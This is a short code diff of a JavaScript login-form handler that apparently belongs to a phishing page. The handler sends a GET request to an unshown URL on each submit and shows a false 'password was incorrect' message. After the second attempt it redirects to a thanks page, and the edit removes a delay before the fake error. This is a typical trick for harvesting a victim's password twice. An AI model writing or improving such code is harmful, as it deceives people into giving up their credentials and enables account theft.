@@ -28,10 +28,10 @@ form.addEventListener("submit", (e) => {
         api.open("GET", url, true);
         api.send();
         clicking = clicking + 1;
-  setTimeout(function () {
+
     document.getElementById("alert-message").innerHTML =
       "Sorry, your password was incorrect. Please double-check your password.";
-  }, 1000);
+
   if (clicking == 2) {
     window.location.replace("thanks.html");
   }
